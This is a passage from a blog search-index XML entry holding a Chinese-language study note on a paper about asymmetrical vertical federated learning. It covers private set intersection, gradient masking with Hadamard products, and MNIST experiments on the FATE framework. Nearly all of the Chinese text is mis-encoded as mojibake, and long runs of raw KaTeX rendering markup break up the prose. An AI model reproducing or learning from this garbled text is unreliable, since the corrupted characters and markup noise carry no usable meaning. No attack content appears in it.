mathvariant="bold">w</mi><mi>k</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">âŸ©</mo></mrow><mo>=</mo><msub><mo>âˆ‘</mo><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>âˆˆ</mo><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup></mrow></msub><mrow><mo fence="true">âŸ¨</mo><msub><mi>Ï•</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><mo fence="true">âŸ©</mo></mrow><msubsup><mi mathvariant="bold">x</mi><mi>i</mi><mi>s</mi></msubsup></mrow><annotation encoding="application/x-tex">\left\langle\left|\mathcal{I}_{1}^{o} \cap \mathcal{I}_{2}^{o}\right| \cdot \nabla^{s} \mathcal{L}\left(\mathbf{w}_{k}\right)\right\rangle=\sum_{e_{i} \in \mathcal{I}^{o b f}}\left\langle\phi_{i k}\right\rangle \mathbf{x}_{i}^{s}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âŸ¨</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord">âˆ‡</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mord mathcal">L</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathbf" style="margin-right:0.01597em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.016em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">âŸ©</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1498em;vertical-align:-0.3998em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2477em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">âˆˆ</span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.782em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3998em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âŸ¨</span><span class="mord"><span class="mord mathnormal">Ï•</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âŸ©</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œæ³¨æ„å¯¹åº”æ˜æ–‡çš„ç³»æ•°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">âˆ£</mi><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>âˆ©</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mi mathvariant="normal">âˆ£</mi></mrow><annotation encoding="application/x-tex">|\mathcal{I}_1^o\cap\mathcal{I}_2^o|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span></span></span></span>ï¼Œè™½ç„¶ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸çŸ¥é“ç³»æ•°ï¼ˆå³å…¶è¿äº¤é›†ç»“æœçš„åŸºæ•°cardinalityéƒ½ä¸çŸ¥é“ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªé™¤ç³»æ•°çš„æ“ä½œæ˜¯é€šè¿‡å°†å¯†æ–‡å‘é€ç»™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ï¼Œè®©å…¶åœ¨æ©ç ä¸‹å®Œæˆé™¤ç³»æ•°æ“ä½œã€‚</p><p>è¿™é‡Œæ˜¯é€šè¿‡<code>å“ˆè¾¾ç›ä¹˜ç§¯ï¼ˆHadamard Productï¼‰</code>æ·»åŠ æ©ç çš„ï¼ŒHadamard Productæ˜¯ä¸€ç§å¯¹ä¸¤åŒå‹çŸ©é˜µè¿›è¡Œçš„è¿ç®—ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mo>âˆ˜</mo><mi>B</mi><msub><mo stretchy="false">)</mo><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>A</mi><msub><mo stretchy="false">)</mo><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo stretchy="false">(</mo><mi>B</mi><msub><mo stretchy="false">)</mo><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">(A \circ B)_{i j}=(A)_{i j}(B)_{i j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ˜</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>å³æ˜¯é€å…ƒç´ æ·»åŠ æ¨¡ä¹˜çš„æ©ç ã€‚ç”±äºæ˜æ–‡è¿ç®—çš„éœ€è¦ï¼Œè¿™é‡Œ<strong>åªèƒ½æ·»åŠ æ¨¡ä¹˜æ©ç </strong>ï¼Œä¸èƒ½æ·»åŠ æ¨¡åŠ æ©ç ï¼Œæ©ç çš„æœ¬è´¨æ˜¯ä¸€æ¬¡ä¸€å¯†ï¼Œæ¨¡åŠ å’Œæ¨¡ä¹˜éƒ½å¯ä»¥ï¼Œä½†è¿™é‡Œè®¡ç®—è¾“å‡ºæ—¶æ˜¯éœ€è¦æ¶ˆé™¤æ©ç çš„ï¼Œä¸ºäº†æ¶ˆé™¤æ¨¡ä¹˜çš„æ©ç ï¼Œæ“ä½œéœ€è¦åœ¨åŸŸä¸Šè¿›è¡Œæ“ä½œï¼ˆä¸èƒ½ä»…ä»…æ˜¯ç¯ï¼‰ã€‚</p><h1 id="Experiments">Experiments</h1><p>å®éªŒå°†éªŒè¯<code>APSI+AVLR</code>åè®®çš„å¯è¡Œæ€§ï¼Œå¹¶ä¸å¯¹ç§°å‹åè®®è¿›è¡Œå¯¹æ¯”ã€‚</p><h2 id="Settings">Settings</h2><ul><li><p>æ¡†æ¶ï¼šFATE</p></li><li><p>ç¡¬ä»¶ï¼šä¸¤æ–¹éƒ½ä½¿ç”¨4æ ¸å¿ƒï¼Œ16 GB RAMçš„è…¾è®¯äº‘æœåŠ¡å™¨</p></li><li><p>æ•°æ®é›†ï¼šMNISTâ€”â€”60000ä¸ªæ ·æœ¬ï¼Œæ¯ä¸ªæ ·æœ¬784ä¸ªç‰¹å¾ï¼ˆè¾“å…¥çš„åƒç´ ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šæ‰‹å·¥ä¸ºæ¯ä¸€ä¸ªæ ·æœ¬åˆ†é…ä¸€ä¸ªIDï¼Œåˆ’åˆ†å’Œåˆ†é…çš„è§„åˆ™å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718125443368.png" alt></p></li></ul><p>è”é‚¦è®­ç»ƒå°†ä¼šåœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å…±æœ‰çš„10000ä¸ªæ ·æœ¬ä¸Šè¿›è¡Œï¼ˆå› æ­¤ï¼Œé¢„è®¡è®­ç»ƒæ€§èƒ½ä¸å¦‚å…¶ä»–å°†æ•´ä¸ªæ•°æ®é›†ä½œä¸ºè¾“å…¥çš„ç®—æ³•ï¼Œä½†ä¸å½±å“éªŒè¯å’Œæ¯”è¾ƒï¼‰ã€‚</p><h2 id="Numerical-Results">Numerical Results</h2><p>è¶…å‚æ•°è®¾ç½®ï¼šå­¦ä¹ ç‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î·</mi><mo>=</mo><mn>0.15</mn></mrow><annotation encoding="application/x-tex">\eta=0.15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">Î·</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0.15</span></span></span></span>ï¼Œè¿­ä»£æ¬¡æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>=</mo><mn>150</mn></mrow><annotation encoding="application/x-tex">=150</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">150</span></span></span></span></p><p>ä¸æ–­å¢åŠ å®‰å…¨æ•°ï¼ˆsecurity numbersï¼‰ï¼Œå³<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mtext>Â </mtext><mn>0.25</mn><mo separator="true">,</mo><mtext>Â </mtext><mn>0.5</mn><mo separator="true">,</mo><mtext>Â </mtext><mn>0.75</mn><mo separator="true">,</mo><mtext>Â </mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">\lambda=0,\ 0.25,\ 0.5,\ 0.75,\ 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0.25</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0.5</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0.75</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span></span></span></span> åˆ†åˆ«è¿›è¡Œæµ‹è¯•ï¼Œè®°å½•å„ç§æƒ…å†µä¸‹è®­ç»ƒçš„æŸå¤±å’ŒAUCï¼Œå¹¶ç»˜åˆ¶å‡ºæ¨¡ç³Šè½¨è¿¹å›¾ï¼š</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718130543639.png" alt></p><p>ç”±å›¾5å¯è§ï¼Œè®­ç»ƒçš„æŸå¤±ä¸éšå®‰å…¨æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span></span></span></span> å˜åŒ–è€Œå˜åŒ–ã€‚æ³¨æ„ï¼š<strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\lambda=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¯¹åº”çš„å¯¹ç§°å‹ å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lambda= 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>å¯¹åº”çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>=</mo><msubsup><mi mathvariant="script">I</mi><mi>i</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}=\mathcal{I}_i^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.942em;vertical-align:-0.2587em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span></span></span></span></span></span></span></span></span></span> çš„æƒ…å†µå¯¹åº”çš„è®­ç»ƒæŸå¤±è¡¨ç°æ˜¯ç›¸åŒçš„</strong>ã€‚</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718130909464.png" alt></p><p>[AUC](å¦‚ä½•ç†è§£æœºå™¨å­¦ä¹ å’Œç»Ÿè®¡ä¸­çš„AUCï¼Ÿ - æ— æ¶¯çš„å›ç­” - çŸ¥ä¹ <a href="https://www.zhihu.com/question/39840928/answer/241440370">https://www.zhihu.com/question/39840928/answer/241440370</a>)æ˜¯ä¸€ä¸ªç”¨äºè¯„ä»·äºŒåˆ†ç±»æ¨¡å‹çš„æ¨¡å‹è¯„ä»·æŒ‡æ ‡ï¼Œä¸ºROCæ›²çº¿ä¸‹çš„å›¾å½¢é¢ç§¯ã€‚</p><p><em>ï¼ˆä¸æ¸…æ¥šMNISTå¯¹åº”çš„å¹¶ä¸ä¸ºäºŒåˆ†ç±»é—®é¢˜ï¼Œä¸çŸ¥é“ä¸ºå•¥èƒ½ç”¨ï¼‰</em></p><p>ç”±å›¾6å¯è§ï¼Œä¸åŒ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î»</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">Î»</span></span></span></span> å¯¹åº”çš„AUCæ›²çº¿çš„è¶‹åŠ¿ç›¸è¿‘ã€‚</p><p>å®éªŒéªŒè¯ï¼šåœ¨å¼•å…¥æ•°å­¦æ’ç­‰å¼çš„æ¦‚å¿µåï¼Œ<code>APSI+AVLRåè®®</code>æ‹¥æœ‰ä¸å¯¹ç§°çºµå‘è”é‚¦å­¦ä¹ æ‹¥æœ‰ç›¸åŒçš„è¡¨ç°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è®ºæ–‡é˜…è¯» </category>
          
          <category> éšç§ä¿æŠ¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç§è®¡ç®— </tag>
            
            <tag> PSI </tag>
            
            <tag> è”é‚¦å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
